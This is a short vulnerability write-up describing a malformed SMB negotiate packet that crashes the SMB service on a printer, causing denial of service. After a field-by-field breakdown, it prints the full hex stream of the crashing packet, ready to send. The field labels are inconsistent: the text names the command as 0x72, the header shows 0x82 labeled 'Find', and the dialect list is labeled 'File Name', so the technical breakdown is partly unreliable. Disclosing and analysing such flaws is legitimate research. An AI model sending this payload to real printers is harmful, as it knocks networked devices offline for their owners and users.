The function SMBnegprot 0x72 is used at the beginning of a session to establish the dialect
to be used. When packets are being sent to negotiate the dialect, a string is used to indicate whichdialects are supported.

--<SMB Header>--
Server Component: SMB (ff 53 4d 42)
SMB Command: Find (82) [The overflow vuln is in this command]
NT Status: STATUS_SUCCESS (00 00 00 00)
Flags: 0x18, Canonicalized Pathnames, Case Sensitivity (18)
Flags2: 0xc853, Unicode Strings, Error Code Type, Extended Security Negotiation, Long Names Used,
Secuirty Signature Required, Extended Attributes, Long Names Allowed (53 c8)

Process ID High: 0 (00 00)
Signature: (00 00 00 00 00 00 00 00)
Reserved: (00 00)
Tree ID: (00 00)
Process ID: (00 00)
User ID: (00 00)
Multiplex ID: (00 00)

--<Find Request [0x82]>--
Word Count (WCT): (00)
Byte Count (BCC): (62 00)
Buffer Format: Dialect (02)
File Name [These bytes cause the crash]: 
	   50 43 20 4e 45 54 57 4f 52 4b 20 50 52 4f 47 52 41 4d 20 31 2e 30 00 
	   02 4c 41 4e 4d 41 4e 31 2e 30 00 02 57 69 6e 64 6f 77 73 20 66 6f 72 
	   20 57 6f 72 6b 67 72 6f 75 70 73 20 33 2e 31 61 00 02 4c 4d 31 2e 32 
	   58 30 30 32 00 02 4c 41 4e 4d 41 4e 32 2e 31 00 02 4e 54 20 4c 4d 20 
	   30 2e 31 32 00

The file name is actually the dialect string with corrupted bytes thats what is causing the crash.

The full packet needed to be sent to the SMB service on the printer in order to cause the DoS is (in hex stream format): 00000085ff534d4282000000001853c80000000000000000000000000000000000000000006200025043204e4554574f524b2050524f4752414d20312e3000024c414e4d414e312e30000257696e646f777320666f7220576f726b67726f75707320332e316100024c4d312e325830303200024c414e4d414e322e3100024e54204c4d20302e313200

I will probably edit this and add more information in the future as I gain a deeper understanding
as to what is happening in the printers memory. 
